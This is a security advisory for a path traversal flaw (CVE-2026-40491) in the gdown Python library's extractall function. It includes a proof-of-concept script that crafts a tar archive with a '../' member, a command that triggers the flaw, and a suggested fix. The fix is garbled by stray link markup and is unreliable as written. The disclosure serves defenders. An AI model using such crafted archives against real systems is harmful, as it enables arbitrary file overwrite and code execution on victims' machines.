# [M] gdown Affected by Arbitrary File Write via Path Traversal in gdown.extractall

## Summary
Severity: Medium
Advisory: GHSA-76hw-p97h-883f
CVE: CVE-2026-40491
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-76hw-p97h-883f
Type: github-advisory

## Affected
- PyPI: `gdown` — affected >=0 <5.2.2

## Details
### Summary
The gdown library (tested on v5.2.1) is vulnerable to a Path Traversal attack within its extractall functionality. When extracting a maliciously crafted ZIP or TAR archive, the library fails to sanitize or validate the filenames of the archive members. This allow files to be written outside the intended destination directory, potentially leading to arbitrary file overwrite and Remote Code Execution (RCE).

### Details
The vulnerability exists in `gdown/extractall.py` within the `extractall()` function. The function takes an archive path and a destination directory (`to`), then calls the underlying `extractall()` method of Python's `tarfile` or `zipfile` modules without validating whether the archive members stay within the `to` boundary.

Vulnerable Code:
```
# gdown/extractall.py
def extractall(path, to=None):
    # ... (omitted) ...
    with opener(path, mode) as f:
        f.extractall(path=to)  # Vulnerable: No path validation or filters`
```
Even on modern Python versions (3.12+), if the `filter` parameter is not explicitly set or if the library's wrapper logic bypasses modern protections, path traversal remains possible as demonstrated in the PoC.


### PoC
## Steps to Reproduce

1. Create the Malicious Archive (`poc.py`):
```
import tarfile
import io
import os

# Create a target directory
os.makedirs("./safe_target/subfolder", exist_ok=True)

# Generate a TAR file containing a member with path traversal
with tarfile.open("evil.tar", "w") as tar:
    # Target: escape the subfolder and write to the parent 'safe_target'
    payload = tarfile.TarInfo(name="../escape.txt")
    content = b"Path Traversal Success!"
    payload.size = len(content)
    tar.addfile(payload, io.BytesIO(content))

print("[+] evil.tar created.")`
```
1. Execute the Vulnerable Function:
```
`python3 -c "from gdown import extractall; extractall('evil.tar', to='./safe_target/subfolder')"`
```
1. Verify the Escape:
```
ls -l ./safe_target/escape.txt
# Output: -rw-r--r-- 1 user user 23 Mar 15 2026 ./safe_target/escape.txt`
```

### Impact
An attacker can provide a specially crafted archive that, when extracted via `gdown`, overwrites critical files on the victim's system.

- Arbitrary File Overwrite: Overwriting `.bashrc`, `.ssh/authorized_keys`, or configuration files.
- Remote Code Execution (RCE): By overwriting executable scripts or Python modules within a virtual environment.


### Recommended Mitigation 
mplement path validation to ensure that all extracted files are contained within the target directory.

**Suggested Fix:**

```
import os

def is_within_directory(directory, target):
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    prefix = os.path.commonpath([abs_directory])
    return os.path.commonpath([abs_directory, abs_target]) == prefix

# Inside [extractall.py](http://extractall.py/)
with opener(path, mode) as f:
    if isinstance(f, tarfile.TarFile):
        for member in f.getmembers():
            member_path = os.path.join(to, [member.name](http://member.name/))
            if not is_within_directory(to, member_path):
                raise Exception("Attempted Path Traversal in Tar File")
    f.extractall(path=to)
```

## References
- https://github.com/wkentaro/gdown/security/advisories/GHSA-76hw-p97h-883f
- https://nvd.nist.gov/vuln/detail/CVE-2026-40491
- https://github.com/wkentaro/gdown/commit/af569fc6ed300b7974dee66dc51e9f01b57b4dff
- https://github.com/wkentaro/gdown
- https://github.com/wkentaro/gdown/releases/tag/v5.2.2
